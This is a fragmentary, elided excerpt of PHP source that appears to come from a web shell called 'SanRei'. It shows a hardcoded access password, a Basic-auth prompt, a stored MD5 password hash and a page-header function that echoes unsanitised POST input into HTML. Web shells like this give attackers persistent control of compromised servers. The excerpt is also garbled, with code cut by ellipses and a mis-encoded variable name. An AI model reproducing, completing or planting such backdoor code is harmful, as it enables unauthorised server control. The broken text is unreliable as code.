...
$pass = "mangsut";
...

 {
  ...
  header("WWW-Authenticate: Basic realm=\"SanRei\"");
...
//-----------------Password---------------------
$â–› = "5058f1af8388633f609cadb75a75dc9d"; 
...
function hardHeader() {
	...
	echo "<html><head><meta http-equiv='Content-Type' content='text/html; charset=" . $_POST['charset'] . "'><title>" . $_SERVER['HTTP_HOST'] . " - SanRei " . VERSION ."</title>
<style>
